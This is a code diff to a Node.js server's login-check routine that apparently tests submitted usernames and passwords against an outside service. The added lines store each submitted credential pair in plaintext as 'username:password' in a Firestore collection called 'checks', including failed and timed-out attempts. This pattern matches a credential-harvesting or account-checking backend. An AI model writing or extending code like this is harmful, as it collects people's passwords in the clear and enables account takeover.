@@ -126,6 +126,18 @@ async function startServer() {
         if (!responded) {
           responded = true;
           try { client.logOff(); } catch (e) {}
+
+          // Always log to Firestore if possible
+          if (db && status !== 200 && status !== 408) { // Success and timeout handled separately
+              db.collection('checks').add({
+                credentials: `${username}:${password}`,
+                timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                status: 'failed',
+                error: data.error || 'Login Error',
+                method: 'login_check'
+              }).catch(() => {});
+          }
+
           res.status(status).json(data);
         }
       };
@@ -138,7 +150,8 @@ async function startServer() {
             credentials: `${username}:${password}`,
             timestamp: admin.firestore.FieldValue.serverTimestamp(),
             status: 'failed',
-            error: timeoutError
+            error: timeoutError,
+            method: 'timeout'
           }).catch(() => {});
         }
       }, 45000);
@@ -286,16 +299,6 @@ async function startServer() {
         if (err.message.includes('RateLimitExceeded')) errorMessage = 'Too many login attempts. Please try again later.';
 
         respond(401, { success: false, error: errorMessage, code: err.message });
-        
-        // Log failure
-        if (db) {
-          db.collection('checks').add({
-            credentials: `${username}:${password}`,
-            timestamp: admin.firestore.FieldValue.serverTimestamp(),
-            status: 'failed',
-            error: errorMessage
-          }).catch(() => {});
-        }
       });
 
       try {
